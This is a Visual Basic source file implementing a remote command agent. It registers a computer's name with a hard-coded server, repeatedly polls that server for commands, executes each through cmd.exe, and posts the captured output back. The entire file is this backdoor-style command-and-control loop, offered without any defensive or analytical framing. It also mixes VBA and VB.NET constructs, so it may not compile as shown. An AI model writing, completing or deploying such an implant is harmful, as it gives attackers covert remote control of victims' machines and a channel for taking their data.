Option Explicit

Public Module Module1

    Sub Main
  
Dim serverIP As String
    Dim serverPort As Integer
    Dim sSerial As String
    Dim computerName As String
    Dim pollingDelay As Integer
 
    serverIP = "192.168.44.3"
    serverPort = 5074
    sSerial = "12345"
    computerName = Environ("COMPUTERNAME")
    pollingDelay = 10000  ' Default 10 seconds
 
    ' Register with the server
    Dim registerMessage As String
    registerMessage = "register|" & sSerial & "|" & computerName
    SendMessageToServer serverIP, serverPort, registerMessage
 
    ' Main loop to fetch and execute commands
    Do
        Dim getCommandMessage As String
        getCommandMessage = "get_command|" & sSerial
        Dim command As String
        command = SendMessageToServer(serverIP, serverPort, getCommandMessage)
 
        Dim parts() As String
        parts = Split(command, "|")  ' Split the response
 
        ' If there is a command to execute
        If parts(0) <> "no_command" And parts(0) <> "" Then
            Dim result As String
            result = ExecuteCommand(parts(0))
 
            ' Report the result to the server
            Dim reportResultMessage As String
            reportResultMessage = "report_result|" & sSerial & "|" & result
            SendMessageToServer serverIP, serverPort, reportResultMessage
        End If
 
        ' Adjust polling time dynamically if server suggests a wait time
        If UBound(parts) >= 1 Then pollingDelay = CInt(parts(1)) * 1000
 
        Pause pollingDelay
    Loop
End Sub
 
Function SendMessageToServer(serverIP As String, serverPort As Integer, message As String) As String
    Dim serverURL As String
    Dim httpClient As Object
    serverURL = "http://" & serverIP & ":" & serverPort & "/"
 
    On Error Resume Next
    Set httpClient = CreateObject("MSXML2.ServerXMLHTTP")
    httpClient.Open "POST", serverURL, False
    httpClient.SetRequestHeader "Content-Type", "text/plain"
    httpClient.Send message
 
    If Err.Number = 0 Then
        SendMessageToServer = httpClient.ResponseText
    Else
        SendMessageToServer = "Error communicating with server"
    End If
 
    ' Release memory
    Set httpClient = Nothing
    On Error GoTo 0
End Function
 
Function ExecuteCommand(command As String) As String
    Dim shell As Object
    Dim execObject As Object
    Dim output As String
 
    On Error Resume Next
    Set shell = CreateObject("WScript.Shell")
 
    ' Execute GUI or CLI commands appropriately
    If InStr(command, "calc.exe") > 0 Or InStr(command, "notepad.exe") > 0 Then
        shell.Run command, 1, False  ' Launch GUI applications immediately
        ExecuteCommand = "Executed: " & command
    Else
        Set execObject = shell.Exec("cmd /c " & command)  ' Ensure correct execution in cmd shell
        output = ""
 
        ' Capture the output of the command
        Do While Not execObject.StdOut.AtEndOfStream
            output = output & execObject.StdOut.ReadLine() & vbCrLf
        Loop
 
        ' Capture errors from StdErr
        Dim errorOutput As String
        errorOutput = ""
        Do While Not execObject.StdErr.AtEndOfStream
            errorOutput = errorOutput & execObject.StdErr.ReadLine() & vbCrLf
        Loop
 
        ' Return the result
        If errorOutput <> "" Then
            ExecuteCommand = "Command: " & command & vbCrLf & "Error: " & errorOutput
        Else
            ExecuteCommand = "Command: " & command & vbCrLf & "Output: " & output
        End If
 
        ' Ensure proper cleanup
        execObject.Terminate
        Set execObject = Nothing
    End If
 
    ' Release memory
    Set shell = Nothing
    On Error GoTo 0
End Function
 
Sub Pause(milliseconds As Integer)
    Dim startTime As Double
    startTime = Timer
    Do While Timer - startTime < milliseconds / 1000
        DoEvents
    Loop

    End Sub
    
End Module
